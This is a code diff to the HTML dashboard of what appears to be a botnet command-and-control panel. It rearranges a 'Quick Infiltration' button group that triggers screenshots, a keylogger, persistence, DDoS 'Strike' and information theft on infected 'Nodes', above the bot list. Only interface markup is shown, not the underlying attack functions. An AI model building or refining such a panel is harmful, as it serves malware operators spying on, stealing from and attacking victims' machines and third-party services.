@@ -120,8 +120,21 @@
     </header>
 
     <main class="grid grid-cols-12 gap-6 h-[calc(100vh-160px)]">
-        <!-- Sidebar: Bot List -->
+        <!-- Sidebar: Actions & Bot List -->
         <div class="col-span-12 lg:col-span-3 flex flex-col gap-4">
+            <!-- Кнопки зверху -->
+            <div class="glass p-4 rounded-lg shadow-inner">
+                <h2 class="orbitron text-sm font-bold text-red-500 mb-3 uppercase">Quick Infiltration</h2>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="takeScreenshot()" class="btn-action bg-zinc-900 border border-orange-500/50 text-orange-500 py-2 px-1 rounded hover:bg-orange-500/10 text-[11px]">📸 Vision</button>
+                    <button onclick="startKeylogger()" class="btn-action bg-zinc-900 border border-yellow-500/50 text-yellow-500 py-2 px-1 rounded hover:bg-yellow-500/10 text-[11px]">⌨️ Keys</button>
+                    <button onclick="addPersistence()" class="btn-action bg-zinc-900 border border-purple-500/50 text-purple-500 py-2 px-1 rounded hover:bg-purple-500/10 text-[11px]">🔒 Anchor</button>
+                    <button onclick="startDDoS()" class="btn-action bg-zinc-900 border border-red-500/50 text-red-500 py-2 px-1 rounded hover:bg-red-500/10 text-[11px]">☠️ Strike</button>
+                    <button onclick="stealInfo()" class="btn-action bg-zinc-900 border border-blue-500/50 text-blue-500 py-2 px-1 rounded hover:bg-blue-500/10 text-[11px]">🔍 Intel</button>
+                </div>
+            </div>
+
+            <!-- Список ботів знизу -->
             <div class="glass p-4 rounded-lg flex-1 flex flex-col min-h-0">
                 <div class="flex justify-between items-center mb-4">
                     <h2 class="orbitron text-lg font-bold text-red-500">Nodes</h2>
@@ -131,18 +144,7 @@
                 </div>
                 
                 <div id="botlist" class="space-y-2 overflow-y-auto pr-2 custom-scrollbar">
-                    <p class="text-zinc-600 text-center py-8 text-sm italic">Scanning for active nodes...</p>
-                </div>
-            </div>
-
-            <div class="glass p-4 rounded-lg">
-                <h2 class="orbitron text-sm font-bold text-red-500 mb-3 uppercase">Quick Infiltration</h2>
-                <div class="grid grid-cols-3 gap-1">
-                    <button onclick="takeScreenshot()" class="btn-action bg-zinc-900 border border-orange-500/50 text-orange-500 py-1 px-1 rounded hover:bg-orange-500/10 text-[10px]">📸 Vision</button>
-                    <button onclick="startKeylogger()" class="btn-action bg-zinc-900 border border-yellow-500/50 text-yellow-500 py-1 px-1 rounded hover:bg-yellow-500/10 text-[10px]">⌨️ Keys</button>
-                    <button onclick="addPersistence()" class="btn-action bg-zinc-900 border border-purple-500/50 text-purple-500 py-1 px-1 rounded hover:bg-purple-500/10 text-[10px]">🔒 Anchor</button>
-                    <button onclick="startDDoS()" class="btn-action bg-zinc-900 border border-red-500/50 text-red-500 py-1 px-1 rounded hover:bg-red-500/10 text-[10px]">☠️ Strike</button>
-                    <button onclick="stealInfo()" class="btn-action bg-zinc-900 border border-blue-500/50 text-blue-500 py-1 px-1 rounded hover:bg-blue-500/10 text-[10px]">🔍 Intel</button>
+                    <p class="text-zinc-600 text-center py-8 text-sm italic">Scanning...</p>
                 </div>
             </div>
         </div>
